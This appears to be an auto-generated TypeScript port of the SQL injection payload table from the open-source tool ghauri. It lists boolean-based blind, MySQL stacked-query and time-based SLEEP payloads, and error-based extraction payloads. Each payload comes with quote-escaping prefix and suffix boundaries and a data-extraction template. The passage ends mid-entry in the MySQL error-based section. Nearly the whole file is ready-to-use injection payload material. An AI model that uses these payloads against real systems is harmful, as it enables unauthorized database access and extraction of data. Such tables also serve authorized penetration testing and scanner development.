// AUTO-GENERATED from ghauri (ghauri/common/payloads.py PAYLOADS) — do not hand-edit.
// Full detection matrix: per-DBMS x technique x payload, each with its own boundary
// list (comments) and an extraction `vector` ([INFERENCE] placeholder). %2B normalized to '+'.
// Source: https://github.com/r0oth3x49/ghauri (MIT). Regenerate via scratchpad/portgen.

export interface GhBoundary { pref: string; suf: string; }
export interface GhEntry {
  payload: string;   // detection probe: [RANDNUM]=[RANDNUM] (boolean), [SLEEPTIME] (time), r0oth3x49 marker (error)
  vector: string;    // extraction template with [INFERENCE] (and [SLEEPTIME] for time)
  title: string;
  dbms: string;      // "", "MySQL", "Microsoft SQL Server", "PostgreSQL", "Oracle"
  comments: GhBoundary[];
}
export type GhGroups = Record<string, Record<string, GhEntry[]>>;

// Error-based detection/extraction marker (ghauri embeds this via hex/CHAR concat).
export const GH_ERROR_MARKER = "r0oth3x49";
export const GH_ERROR_START = "Injected~";
export const GH_ERROR_END = "~END";

export const GHAURI_PAYLOADS: GhGroups = {
 "BooleanTests": {
  "boolean-based": [
   {
    "payload": "AND [RANDNUM]=[RANDNUM]",
    "vector": "AND [INFERENCE]",
    "title": "AND boolean-based blind - WHERE or HAVING clause",
    "dbms": "",
    "comments": [
     {
      "pref": " ",
      "suf": ""
     },
     {
      "pref": " ",
      "suf": "-- wXyW"
     },
     {
      "pref": "' ",
      "suf": "-- wXyW"
     },
     {
      "pref": "\" ",
      "suf": "-- wXyW"
     },
     {
      "pref": ") ",
      "suf": "-- wXyW"
     },
     {
      "pref": "') ",
      "suf": "-- wXyW"
     },
     {
      "pref": "\") ",
      "suf": "-- wXyW"
     },
     {
      "pref": "' ",
      "suf": " OR '04586'='4586"
     },
     {
      "pref": "\" ",
      "suf": " OR \"04586\"=\"4586"
     },
     {
      "pref": ") ",
      "suf": " AND (04586=4586"
     },
     {
      "pref": ") ",
      "suf": " OR (04586=4586"
     },
     {
      "pref": "') ",
      "suf": " AND ('04586'='4586"
     },
     {
      "pref": "\") ",
      "suf": " AND (\"04586\"=\"4586"
     },
     {
      "pref": "' ",
      "suf": " AND '04586'='4586"
     },
     {
      "pref": "\" ",
      "suf": " AND \"04586\"=\"4586"
     },
     {
      "pref": "') ",
      "suf": " OR ('04586'='4586"
     },
     {
      "pref": "\") ",
      "suf": " OR (\"04586\"=\"4586"
     }
    ]
   },
   {
    "payload": "OR NOT [RANDNUM]=[RANDNUM]",
    "vector": "OR NOT [INFERENCE]",
    "title": "OR boolean-based blind - WHERE or HAVING clause (NOT)",
    "dbms": "",
    "comments": [
     {
      "pref": " ",
      "suf": ""
     },
     {
      "pref": " ",
      "suf": "-- wXyW"
     },
     {
      "pref": "' ",
      "suf": "-- wXyW"
     },
     {
      "pref": "\" ",
      "suf": "-- wXyW"
     },
     {
      "pref": ") ",
      "suf": "-- wXyW"
     },
     {
      "pref": "') ",
      "suf": "-- wXyW"
     },
     {
      "pref": "\") ",
      "suf": "-- wXyW"
     },
     {
      "pref": ") ",
      "suf": " AND (04586=4586"
     },
     {
      "pref": "') ",
      "suf": " AND ('04586'='4586"
     },
     {
      "pref": "\") ",
      "suf": " AND (\"04586\"=\"4586"
     },
     {
      "pref": "' ",
      "suf": " AND '04586'='4586"
     },
     {
      "pref": "\" ",
      "suf": " AND \"04586\"=\"4586"
     }
    ]
   },
   {
    "payload": "OR [RANDNUM]=[RANDNUM]",
    "vector": "OR [INFERENCE]",
    "title": "OR boolean-based blind - WHERE or HAVING clause",
    "dbms": "",
    "comments": [
     {
      "pref": " ",
      "suf": ""
     },
     {
      "pref": " ",
      "suf": "-- wXyW"
     },
     {
      "pref": "' ",
      "suf": "-- wXyW"
     },
     {
      "pref": "\" ",
      "suf": "-- wXyW"
     },
     {
      "pref": ") ",
      "suf": "-- wXyW"
     },
     {
      "pref": "') ",
      "suf": "-- wXyW"
     },
     {
      "pref": "\") ",
      "suf": "-- wXyW"
     },
     {
      "pref": ") ",
      "suf": " AND (04586=4586"
     },
     {
      "pref": ") ",
      "suf": " OR (04586=4586"
     },
     {
      "pref": "') ",
      "suf": " AND ('04586'='4586"
     },
     {
      "pref": "\") ",
      "suf": " AND (\"04586\"=\"4586"
     },
     {
      "pref": "' ",
      "suf": " AND '04586'='4586"
     },
     {
      "pref": "\" ",
      "suf": " AND \"04586\"=\"4586"
     },
     {
      "pref": "') ",
      "suf": " OR ('04586'='4586"
     },
     {
      "pref": "\") ",
      "suf": " OR (\"04586\"=\"4586"
     },
     {
      "pref": "' ",
      "suf": " OR '04586'='4586--"
     },
     {
      "pref": "\" ",
      "suf": " OR \"04586\"=\"4586--"
     }
    ]
   },
   {
    "payload": "(SELECT (CASE WHEN ([RANDNUM]=[RANDNUM]) THEN 03586 ELSE 3*(SELECT 2 UNION ALL SELECT 1) END))",
    "vector": "(SELECT (CASE WHEN ([INFERENCE]) THEN 03586 ELSE 3*(SELECT 2 UNION ALL SELECT 1) END))",
    "title": "Boolean-based blind - Parameter replace",
    "dbms": "",
    "comments": [
     {
      "pref": "",
      "suf": ""
     },
     {
      "pref": " ",
      "suf": "--"
     },
     {
      "pref": "' AND 0546=",
      "suf": "--"
     },
     {
      "pref": "\" AND 0456=",
      "suf": "--"
     },
     {
      "pref": ") AND 0866=",
      "suf": "--"
     },
     {
      "pref": "') AND 0758=",
      "suf": "--"
     },
     {
      "pref": "\") AND 0541=",
      "suf": "--"
     }
    ]
   },
   {
    "payload": "(SELECT (CASE WHEN ([RANDNUM]=[RANDNUM]) THEN [ORIGVALUE] ELSE (SELECT 09567 UNION SELECT 08652) END))",
    "vector": "(SELECT (CASE WHEN ([INFERENCE]) THEN [ORIGVALUE] ELSE (SELECT 09567 UNION SELECT 08652) END))",
    "title": "Boolean-based blind - Parameter replace (original value)",
    "dbms": "",
    "comments": [
     {
      "pref": "",
      "suf": ""
     }
    ]
   },
   {
    "payload": "(SELECT CASE WHEN([RANDNUM]=[RANDNUM]) THEN 9854 ELSE 0 END)",
    "vector": "(SELECT CASE WHEN([INFERENCE]) THEN 9854 ELSE 0 END)",
    "title": "boolean-based blind - WHERE or HAVING clause (CASE STATEMENT)",
    "dbms": "",
    "comments": [
     {
      "pref": "",
      "suf": ""
     },
     {
      "pref": "",
      "suf": "-- wXyW"
     },
     {
      "pref": "' AND ",
      "suf": "-- wXyW"
     },
     {
      "pref": " AND ",
      "suf": "-- wXyW"
     },
     {
      "pref": "\"AND",
      "suf": "AND\"Z"
     },
     {
      "pref": "'AND",
      "suf": "AND'Z"
     },
     {
      "pref": "'XOR",
      "suf": "XOR'Z"
     },
     {
      "pref": "\"XOR",
      "suf": "XOR\"Z"
     },
     {
      "pref": "'OR",
      "suf": "OR'Z"
     },
     {
      "pref": "\"OR",
      "suf": "OR\"Z"
     },
     {
      "pref": " AND 9854=",
      "suf": "-- wXyW"
     },
     {
      "pref": " OR 9854=",
      "suf": "-- wXyW"
     },
     {
      "pref": "' AND ",
      "suf": "-- wXyW"
     },
     {
      "pref": "\" AND ",
      "suf": "-- wXyW"
     },
     {
      "pref": ") AND ",
      "suf": "-- wXyW"
     },
     {
      "pref": "') AND ",
      "suf": "-- wXyW"
     },
     {
      "pref": "\") AND ",
      "suf": "-- wXyW"
     }
    ]
   }
  ]
 },
 "MySQL": {
  "inline-query": [],
  "stacked-queries": [
   {
    "payload": "(SELECT(1)FROM(SELECT(SLEEP([SLEEPTIME])))a)",
    "vector": "(SELECT(1)FROM(SELECT(IF([INFERENCE],SLEEP([SLEEPTIME]),0)))a)",
    "title": "MySQL >= 5.0.12 stacked queries (query SLEEP)",
    "dbms": "MySQL",
    "comments": [
     {
      "pref": ";",
      "suf": "--"
     },
     {
      "pref": ",",
      "suf": "--"
     },
     {
      "pref": "';",
      "suf": "--"
     },
     {
      "pref": "\";",
      "suf": "--"
     },
     {
      "pref": ");",
      "suf": "--"
     },
     {
      "pref": "');",
      "suf": "--"
     },
     {
      "pref": "\");",
      "suf": "--"
     },
     {
      "pref": "',",
      "suf": "--"
     },
     {
      "pref": "\",",
      "suf": "--"
     }
    ]
   },
   {
    "payload": "if(now()=sysdate(),sleep([SLEEPTIME]),0)",
    "vector": "if([INFERENCE],sleep([SLEEPTIME]),0)",
    "title": "MySQL >= 5.0.12 stacked queries (query SLEEP - comment)",
    "dbms": "MySQL",
    "comments": [
     {
      "pref": ";",
      "suf": "--"
     },
     {
      "pref": ",",
      "suf": "--"
     },
     {
      "pref": "';",
      "suf": "--"
     },
     {
      "pref": "\";",
      "suf": "--"
     },
     {
      "pref": ");",
      "suf": "--"
     },
     {
      "pref": "');",
      "suf": "--"
     },
     {
      "pref": "\");",
      "suf": "--"
     },
     {
      "pref": "',",
      "suf": "--"
     },
     {
      "pref": "\",",
      "suf": "--"
     }
    ]
   },
   {
    "payload": "(SELECT CASE WHEN(1234=1234) THEN SLEEP([SLEEPTIME]) ELSE 0 END)",
    "vector": "(SELECT CASE WHEN([INFERENCE]) THEN SLEEP([SLEEPTIME]) ELSE 0 END)",
    "title": "MySQL >= 5.0.12 stacked queries (query SLEEP - CASE STATEMENT)",
    "dbms": "MySQL",
    "comments": [
     {
      "pref": ";",
      "suf": "--"
     },
     {
      "pref": ",",
      "suf": "--"
     },
     {
      "pref": "';",
      "suf": "--"
     },
     {
      "pref": "\";",
      "suf": "--"
     },
     {
      "pref": ");",
      "suf": "--"
     },
     {
      "pref": "');",
      "suf": "--"
     },
     {
      "pref": "\");",
      "suf": "--"
     },
     {
      "pref": "',",
      "suf": "--"
     },
     {
      "pref": "\",",
      "suf": "--"
     }
    ]
   }
  ],
  "boolean-based": [
   {
    "payload": "AND [RANDNUM]=[RANDNUM]",
    "vector": "AND [INFERENCE]",
    "title": "AND boolean-based blind - WHERE or HAVING clause (MySQL comment)",
    "dbms": "MySQL",
    "comments": [
     {
      "pref": " ",
      "suf": "#"
     },
     {
      "pref": "' ",
      "suf": "#"
     },
     {
      "pref": "\" ",
      "suf": "#"
     },
     {
      "pref": ") ",
      "suf": "#"
     },
     {
      "pref": "') ",
      "suf": "#"
     },
     {
      "pref": "\") ",
      "suf": "#"
     }
    ]
   },
   {
    "payload": "OR [RANDNUM]=[RANDNUM]",
    "vector": "OR [INFERENCE]",
    "title": "OR boolean-based blind - WHERE or HAVING clause (MySQL comment)",
    "dbms": "MySQL",
    "comments": [
     {
      "pref": " ",
      "suf": "#"
     },
     {
      "pref": "' ",
      "suf": "#"
     },
     {
      "pref": "\" ",
      "suf": "#"
     },
     {
      "pref": ") ",
      "suf": "#"
     },
     {
      "pref": "') ",
      "suf": "#"
     },
     {
      "pref": "\") ",
      "suf": "#"
     }
    ]
   },
   {
    "payload": "OR NOT [RANDNUM]=[RANDNUM]",
    "vector": "OR NOT [INFERENCE]",
    "title": "OR boolean-based blind - WHERE or HAVING clause (NOT - MySQL comment)",
    "dbms": "MySQL",
    "comments": [
     {
      "pref": " ",
      "suf": "#"
     },
     {
      "pref": "' ",
      "suf": "#"
     },
     {
      "pref": "\" ",
      "suf": "#"
     },
     {
      "pref": ") ",
      "suf": "#"
     },
     {
      "pref": "') ",
      "suf": "#"
     },
     {
      "pref": "\") ",
      "suf": "#"
     }
    ]
   },
   {
    "payload": "RLIKE (SELECT (CASE WHEN ([RANDNUM]=[RANDNUM]) THEN [ORIGVALUE] ELSE 0x28 END))",
    "vector": "RLIKE (SELECT (CASE WHEN ([INFERENCE]) THEN [ORIGVALUE] ELSE 0x28 END))",
    "title": "MySQL RLIKE boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause",
    "dbms": "MySQL",
    "comments": [
     {
      "pref": "",
      "suf": ""
     }
    ]
   },
   {
    "payload": "(IF([RANDNUM]=[RANDNUM],1,(select table_name from information_schema.tables)))",
    "vector": "(IF([INFERENCE],1,(select table_name from information_schema.tables)))",
    "title": "MySQL boolean-based blind - (IF STATEMENT)",
    "dbms": "MySQL",
    "comments": [
     {
      "pref": "'AND",
      "suf": "AND'Z"
     },
     {
      "pref": "\"AND",
      "suf": "AND\"Z"
     },
     {
      "pref": "'XOR",
      "suf": "XOR'Z"
     },
     {
      "pref": "\"XOR",
      "suf": "XOR\"Z"
     },
     {
      "pref": "'OR",
      "suf": "OR'Z"
     },
     {
      "pref": "\"OR",
      "suf": "OR\"Z"
     }
    ]
   }
  ],
  "time-based": [
   {
    "payload": "(SELECT(0)FROM(SELECT(SLEEP([SLEEPTIME])))a)",
    "vector": "(SELECT(0)FROM(SELECT(IF([INFERENCE],SLEEP([SLEEPTIME]),0)))a)",
    "title": "MySQL >= 5.0.12 time-based blind (query SLEEP)",
    "dbms": "MySQL",
    "comments": [
     {
      "pref": "'XOR",
      "suf": "XOR'Z"
     },
     {
      "pref": "\"XOR",
      "suf": "XOR\"Z"
     },
     {
      "pref": "",
      "suf": ""
     },
     {
      "pref": "'+",
      "suf": "+'"
     },
     {
      "pref": "\"+",
      "suf": "+\""
     },
     {
      "pref": "'OR",
      "suf": "OR'Z"
     },
     {
      "pref": "\"OR",
      "suf": "OR\"Z"
     },
     {
      "pref": "'AND",
      "suf": "AND'Z"
     },
     {
      "pref": "\"AND",
      "suf": "AND\"Z"
     },
     {
      "pref": " AND ",
      "suf": "-- wXyW"
     },
     {
      "pref": "' AND ",
      "suf": "-- wXyW"
     },
     {
      "pref": "\" AND ",
      "suf": "-- wXyW"
     },
     {
      "pref": ") AND ",
      "suf": "-- wXyW"
     },
     {
      "pref": "') AND ",
      "suf": "-- wXyW"
     },
     {
      "pref": "\") AND ",
      "suf": "-- wXyW"
     }
    ]
   },
   {
    "payload": "if(now()=sysdate(),SLEEP([SLEEPTIME]),0)",
    "vector": "if([INFERENCE],SLEEP([SLEEPTIME]),0)",
    "title": "MySQL >= 5.0.12 time-based blind (IF - comment)",
    "dbms": "MySQL",
    "comments": [
     {
      "pref": "'XOR(",
      "suf": ")XOR'Z"
     },
     {
      "pref": "\"XOR(",
      "suf": ")XOR\"Z"
     },
     {
      "pref": "",
      "suf": ""
     },
     {
      "pref": "",
      "suf": "-- wXyW"
     },
     {
      "pref": "'AND(",
      "suf": ")AND'Z"
     },
     {
      "pref": "'OR(",
      "suf": ")OR'Z"
     },
     {
      "pref": "\"OR(",
      "suf": ")OR\"Z"
     },
     {
      "pref": " AND ",
      "suf": "-- wXyW"
     },
     {
      "pref": "' AND ",
      "suf": "-- wXyW"
     },
     {
      "pref": "\" AND ",
      "suf": "-- wXyW"
     },
     {
      "pref": ") AND ",
      "suf": "-- wXyW"
     },
     {
      "pref": "') AND ",
      "suf": "-- wXyW"
     },
     {
      "pref": "\") AND ",
      "suf": "-- wXyW"
     }
    ]
   },
   {
    "payload": "(SELECT CASE WHEN(1234=1234) THEN SLEEP([SLEEPTIME]) ELSE 0 END)",
    "vector": "(SELECT CASE WHEN([INFERENCE]) THEN SLEEP([SLEEPTIME]) ELSE 0 END)",
    "title": "MySQL >= 5.0.12 time-based blind (CASE STATEMENT)",
    "dbms": "MySQL",
    "comments": [
     {
      "pref": "'XOR",
      "suf": "XOR'Z"
     },
     {
      "pref": "\"XOR",
      "suf": "XOR\"Z"
     },
     {
      "pref": "",
      "suf": ""
     },
     {
      "pref": "'OR",
      "suf": "OR'Z"
     },
     {
      "pref": "'AND",
      "suf": "AND'Z"
     },
     {
      "pref": "'+",
      "suf": "+'"
     },
     {
      "pref": "",
      "suf": "-- wXyW"
     },
     {
      "pref": "\"AND",
      "suf": "AND\"Z"
     },
     {
      "pref": " AND ",
      "suf": "-- wXyW"
     },
     {
      "pref": "' AND ",
      "suf": "-- wXyW"
     },
     {
      "pref": "\" AND ",
      "suf": "-- wXyW"
     },
     {
      "pref": ") AND ",
      "suf": "-- wXyW"
     },
     {
      "pref": "') AND ",
      "suf": "-- wXyW"
     },
     {
      "pref": "\") AND ",
      "suf": "-- wXyW"
     }
    ]
   },
   {
    "payload": "SLEEP([SLEEPTIME])",
    "vector": "0986=IF(([INFERENCE]),SLEEP([SLEEPTIME]),986)",
    "title": "MySQL >= 5.0.12 time-based blind (SLEEP)",
    "dbms": "MySQL",
    "comments": [
     {
      "pref": " AND ",
      "suf": ""
     },
     {
      "pref": " AND ",
      "suf": "-- wXyW"
     },
     {
      "pref": "' AND ",
      "suf": "-- wXyW"
     },
     {
      "pref": "\" AND ",
      "suf": "-- wXyW"
     },
     {
      "pref": ") AND ",
      "suf": "-- wXyW"
     },
     {
      "pref": "') AND ",
      "suf": "-- wXyW"
     },
     {
      "pref": "\") AND ",
      "suf": "-- wXyW"
     }
    ]
   }
  ],
  "error-based": [
   {
    "payload": "AND (SELECT(!x-~0)FROM(SELECT CONCAT_WS(0x28,0x496e6a65637465647e,0x72306f746833783439,0x7e454e44)x)y)",
    "vector": "AND (SELECT(!x-~0)FROM(SELECT CONCAT_WS(0x28,0x496e6a65637465647e,[INFERENCE],0x7e454e44)x)y)",
    "title": "MySQL >= 5.5 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (BIGINT UNSIGNED)",
    "dbms": "MySQL",
    "comments": [
     {
      "pref": " ",
      "suf": "-- wXyW"
     },
     {
      "pref": " ",
      "suf": "#"
     },
     {
      "pref": "' ",
      "suf": "-- wXyW"
     },
     {
      "pref": "' ",
      "suf": "#"
     },
     {
      "pref": "\" ",
      "suf": "-- wXyW"
     },
     {
      "pref": "\" ",
      "suf": "#"
     },
     {
      "pref": ") ",
      "suf": "-- wXyW"
     },
     {
      "pref": ") ",
      "suf": "#"
     },
     {
      "pref": "') ",
      "suf": "-- wXyW"
     },
     {
      "pref": "') ",
      "suf": "#"
     },
     {
      "pref": "\") ",
      "suf": "-- wXyW"
     },
     {
      "pref": "\") ",
      "suf": "#"
     }
    ]
   },
   {
    "payload": "OR (SELECT(!x-~0)FROM(SELECT CONCAT_WS(0x28,0x496e6a65637465647e,0x72306f746833783439,0x7e454e44)x)y)",
    "vector": "OR (SELECT(!x-~0)FROM(SELECT CONCAT_WS(0x28,0x496e6a65637465647e,[INFERENCE],0x7e454e44)x)y)",
    "title": "MySQL >= 5.5 OR error-based - WHERE or HAVING clause (BIGINT UNSIGNED)",
    "dbms": "MySQL",
    "comments": [
     {
      "pref": " ",
      "suf": "-- wXyW"
     },
     {
      "pref": " ",
      "suf": "#"
     },
     {
      "pref": "' ",
      "suf": "-- wXyW"
     },
     {
      "pref": "' ",
      "suf": "#"
     },
     {
      "pref": "\" ",
      "suf": "-- wXyW"
     },
     {
      "pref": "\" ",
      "suf": "#"
     },
     {
      "pref": ") ",
      "suf": "-- wXyW"
     },
     {
      "pref": ") ",
      "suf": "#"
     },
     {
      "pref": "') ",
      "suf": "-- wXyW"
     },
     {
      "pref": "') ",
      "suf": "#"
     },
     {
      "pref": "\") ",
      "suf": "-- wXyW"
     },
     {
      "pref": "\") ",
      "suf": "#"
     }
    ]
   },
   {
    "payload": "AND EXP(~(SELECT*FROM(SELECT CONCAT_WS(0x28,0x496e6a65637465647e,0x72306f746833783439,0x7e454e44)e)x))",
    "vector": "AND EXP(~(SELECT*FROM(SELECT CONCAT_WS(0x28,0x496e6a65637465647e,[INFERENCE],0x7e454e44)e)x))",
    "title": "MySQL >= 5.5 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXP)",
    "dbms": "MySQL",
    "comments": [
     {
      "pref": " ",
      "suf": "-- wXyW"
     },
     {
      "pref": " ",
      "suf": "#"
     },
     {
      "pref": "' ",
      "suf": "-- wXyW"
     },
     {
      "pref": "' ",
      "suf": "#"
     },
     {
      "pref": "\" ",
      "suf": "-- wXyW"
     },
     {
      "pref": "\" ",
      "suf": "#"
     },
     {
      "pref": ") ",
      "suf": "-- wXyW"
     },
     {
      "pref": ") ",
      "suf": "#"
     },
     {
      "pref": "') ",
      "suf": "-- wXyW"
     },
     {
      "pref": "') ",
      "suf": "#"
     },
     {
      "pref": "\") ",
      "suf": "-- wXyW"
     },
     {
      "pref": "\") ",
      "suf": "#"
     }
    ]
   },
   {
    "payload": "OR EXP(~(SELECT*FROM(SELECT CONCAT_WS(0x28,0x496e6a65637465647e,0x72306f746833783439,0x7e454e44)e)x))",
    "vector": "OR EXP(~(SELECT*FROM(SELECT CONCAT_WS(0x28,0x496e6a65637465647e,[INFERENCE],0x7e454e44)e)x))",
    "title": "MySQL >= 5.5 OR error-based - WHERE or HAVING clause (EXP)",
    "dbms": "MySQL",
    "comments": [
     {
      "pref": " ",
      "suf": "-- wXyW"
     },
     {
      "pref": " ",
      "suf": "#"
     },
     {
      "pref": "' ",
      "suf": "-- wXyW"
     },
     {
      "pref": "' ",
      "suf": "#"
     },
     {
      "pref": "\" ",
      "suf": "-- wXyW"
     },
     {
      "pref": "\" ",
      "suf": "#"
     },
     {
      "pref": ") ",
      "suf": "-- wXyW"
     },
     {
      "pref": ") ",
      "suf": "#"
     },
     {
      "pref": "') ",
      "suf": "-- wXyW"
     },
     {
      "pref": "') ",
      "suf": "#"
     },
     {
      "pref": "\") ",
      "suf": "-- wXyW"
     },
     {
      "pref": "\") ",
      "suf": "#"
     }
    ]
   },
   {
    "payload": "AND GTID_SUBSET(CONCAT_WS(0x28,0x496e6a65637465647e,0x72306f746833783439,0x7e454e44),1337)",
    "vector": "AND GTID_SUBSET(CONCAT_WS(0x28,0x496e6a65637465647e,[INFERENCE],0x7e454e44),1337)",
    "title": "MySQL >= 5.6 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (GTID_SUBSET)",
    "dbms": "MySQL",
    "comments": [
     {
      "pref": " ",
      "suf": "-- wXyW"
     },
     {
      "pref": " ",
      "suf": "#"
     },
     {
      "pref": "' ",
      "suf": "-- wXyW"
     },
     {
      "pref": "' ",
      "suf": "#"
     },
     {
      "pref": "\" ",
      "suf": "-- wXyW"
     },
     {
      "pref": "\" ",
      "suf": "#"
     },
     {
      "pref": ") ",
      "suf": "-- wXyW"
     },
     {
      "pref": ") ",
      "suf": "#"
     },
     {
      "pref": "') ",
      "suf": "-- wXyW"
     },
     {
      "pref": "') ",
      "suf": "#"
     },
     {
      "pref": "\") ",
      "suf": "-- wXyW"
     },
     {
      "pref": "\") ",
      "suf": "#"
     }
    ]
   },
   {
    "payload": "OR GTID_SUBSET(CONCAT_WS(0x28,0x496e6a65637465647e,0x72306f746833783439,0x7e454e44),1337)",
    "vector": "OR GTID_SUBSET(CONCAT_WS(0x28,0x496e6a65637465647e,[INFERENCE],0x7e454e44),1337)",
    "title": "MySQL >= 5.6 OR error-based - WHERE or HAVING clause (GTID_SUBSET)",
    "dbms": "MySQL",
    "comments": [
     {
      "pref": " ",
      "suf": "-- wXyW"
     },
     {
      "pref": " ",
      "suf": "#"
     },
     {
      "pref": "' ",
      "suf": "-- wXyW"
     },
     {
      "pref": "' ",
      "suf": "#"
     },
     {
      "pref": "\" ",
      "suf": "-- wXyW"
     },
     {
      "pref": "\" ",
      "suf": "#"
     },
     {
      "pref": ") ",
      "suf": "-- wXyW"
     },
     {
      "pref": ") ",
      "suf": "#"
     },
     {
      "pref": "') ",
      "suf": "-- wXyW"
     },
     {
      "pref": "') ",
      "suf": "#"
     },
     {
      "pref": "\") ",
      "suf": "-- wXyW"
     },
     {
      "pref": "\") ",
      "suf": "#"
     }
    ]
   },
   {
    "payload": "AND JSON_KEYS((SELECT CONVERT((SELECT CONCAT_WS(0x28,0x496e6a65637465647e,0x72306f746833783439,0x7e454e44)) USING utf8)))",
    "vector": "AND JSON_KEYS((SELECT CONVERT((SELECT CONCAT_WS(0x28,0x496e6a65637465647e,[INFERENCE],0x7e454e44)) USING utf8)))",
    "title": "MySQL >= 5.7.8 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (JSON_KEYS)",
    "dbms": "MySQL",
    "comments": [
     {
      "pref": " ",
      "suf": "-- wXyW"
     },
     {
      "pref": " ",
      "suf": "#"
     },
     {
      "pref": "' ",
      "suf": "-- wXyW"
     },
     {
      "pref": "' ",
      "suf": "#"
     },
     {
      "pref": "\" ",
      "suf": "-- wXyW"
     },
     {
      "pref": "\" ",
      "suf": "#"
     },
     {
      "pref": ") ",
      "suf": "-- wXyW"
     },
     {
      "pref": ") ",
      "suf": "#"
     },
     {
      "pref": "') ",
      "suf": "-- wXyW"
     },
     {
      "pref": "') ",
      "suf": "#"
     },
     {
      "pref": "\") ",
      "suf": "-- wXyW"
     },
     {
      "pref": "\") ",
      "suf": "#"
     }
    ]
   },
   {
    "payload": "OR JSON_KEYS((SELECT CONVERT((SELECT CONCAT_WS(0x28,0x496e6a65637465647e,0x72306f746833783439,0x7e454e44)) USING utf8)))",
    "vector": "OR JSON_KEYS((SELECT CONVERT((SELECT CONCAT_WS(0x28,0x496e6a65637465647e,[INFERENCE],0x7e454e44)) USING utf8)))",
    "title": "MySQL >= 5.7.8 OR error-based - WHERE or HAVING clause (JSON_KEYS)",
    "dbms": "MySQL",
    "comments": [
     {
      "pref": " ",
      "suf": "-- wXyW"
     },
     {
      "pref": " ",
      "suf": "#"
     },
     {
      "pref": "' ",
      "suf": "-- wXyW"
     },
     {
      "pref": "' ",
      "suf": "#"
     },
     {
      "pref": "\" ",
      "suf": "-- wXyW"
     },
     {
      "pref": "\" ",
      "suf": "#"
     },
     {
      "pref": ") ",
      "suf": "-- wXyW"
     },
     {
      "pref": ") ",
      "suf": "#"
     },
     {
      "pref": "') ",
      "suf": "-- wXyW"
     },
     {
      "pref": "') ",
      "suf": "#"
     },
     {
      "pref": "\") ",
      "suf": "-- wXyW"
     },
     {
      "pref": "\") ",
      "suf": "#"
     }
    ]
   },
   {
    "payload": "AND (SELECT(x*1E308)FROM(SELECT CONCAT_WS(0x28,0x33,0x496e6a65637465647e,0x72306f746833783439,0x7e454e44)x)y)",
    "vector": "AND (SELECT(x*1E308)FROM(SELECT CONCAT_WS(0x28,0x33,0x496e6a65637465647e,[INFERENCE],0x7e454e44)x)y)",
    "title": "MySQL >= 5.5 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (DOUBLE)",
    "dbms": "MySQL",
    "comments": [
     {
      "pref": " ",
      "suf": "-- wXyW"
     },
     {
      "pref": " ",
      "suf": "#"
     },
     {
      "pref": "' ",
      "suf": "-- wXyW"
     },
     {
      "pref": "' ",
      "suf": "#"
     },
     {
      "pref": "\" ",
      "suf": "-- wXyW"
     },
     {
      "pref": "\" ",
      "suf": "#"
     },
     {
      "pref": ") ",
      "suf": "-- wXyW"
     },
     {
      "pref": ") ",
      "suf": "#"
     },
     {
      "pref": "') ",
      "suf": "-- wXyW"
     },
     {
      "pref": "') ",
      "suf": "#"
     },
     {
      "pref": "\") ",
      "suf": "-- wXyW"
     },
     {
      "pref": "\") ",
      "suf": "#"
     }
    ]
   },
   {
    "payload": "OR (SELECT(x*1E308)FROM(SELECT CONCAT_WS(0x28,0x33,0x496e6a65637465647e,0x72306f746833783439,0x7e454e44)x)y)",
    "vector": "OR (SELECT(x*1E308)FROM(SELECT CONCAT_WS(0x28,0x33,0x496e6a65637465647e,[INFERENCE],0x7e454e44)x)y)",
    "title": "MySQL >= 5.5 OR error-based - WHERE or HAVING clause (DOUBLE)",
    "dbms": "MySQL",
    "comments": [
     {
      "pref": " ",
      "suf": "-- wXyW"
     },
     {
      "pref": " ",
      "suf": "#"
     },
     {
      "pref": "' ",
      "suf": "-- wXyW"
     },
     {
      "pref": "' ",
      "suf": "#"
     },
     {
      "pref": "\" ",
      "suf": "-- wXyW"
     },
     {
      "pref": "\" ",
      "suf": "#"
     },
     {
      "pref": ") ",
      "suf": "-- wXyW"
     },
     {
      "pref": ") ",
      "suf": "#"
     },
     {
      "pref": "') ",
      "suf": "-- wXyW"
     },
     {
      "pref": "') ",
      "suf": "#"
     },
     {
      "pref": "\") ",
      "suf": "-- wXyW"
     },
     {
      "pref": "\") ",
      "suf": "#"
     }
    ]
   },
   {
    "payload": "AND (SELECT(0)FROM(SELECT COUNT(*),CONCAT_WS(0x28,0x7e,0x72306f746833783439,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)",
    "vector": "AND (SELECT(0)FROM(SELECT COUNT(*),CONCAT_WS(0x28,0x7e,[INFERENCE],FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)",
    "title": "MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)",
    "dbms": "MySQL",
    "comments": [
     {
      "pref": " ",
      "suf": "-- wXyW"
     },
     {
      "pref": " ",
      "suf": "#"
     },
     {
      "pref": "' ",
      "suf": "-- wXyW"
     },
     {
      "pref": "' ",
      "suf": "#"
     },
     {
      "pref": "\" ",
      "suf": "-- wXyW"
     },
     {
      "pref": "\" ",
      "suf": "#"
     },
     {
      "pref": ") ",
      "suf": "-- wXyW"
     },
     {
      "pref": ") ",
      "suf": "#"
     },
     {
      "pref": "') ",
      "suf": "-- wXyW"
     },
     {
      "pref": "') ",
      "suf": "#"
     },
     {
      "pref": "\") ",
      "suf": "-- wXyW"
     },
     {
      "pref": "\") ",
      "suf": "#"
     }
    ]
   },
   {
    "payload": "OR 1 GROUP BY CONCAT_WS(0x7e,0x72306f746833783439,FLOOR(RAND(0)*2))HAVING(MIN(0))",
    "vector": "OR 1 GROUP BY CONCAT_WS(0x7e,[INFERENCE],FLOOR(RAND(0)*2))HAVING(MIN(0))",
    "title": "MySQL >= 5.0 OR error-based - WHERE or HAVING clause (FLOOR)",
    "dbms": "MySQL",
    "comments": [
     {
      "pref": " ",
      "suf": "-- wXyW"
     },
     {
      "pref": " ",
      "suf": "#"
     },
     {
      "pref": "' ",
      "suf": "-- wXyW"
     },
     {
      "pref": "' ",
      "suf": "#"
     },
     {
      "pref": "\" ",
      "suf": "-- wXyW"
     },
     {
      "pref": "\" ",
      "suf": "#"
     },
     {
      "pref": ") ",
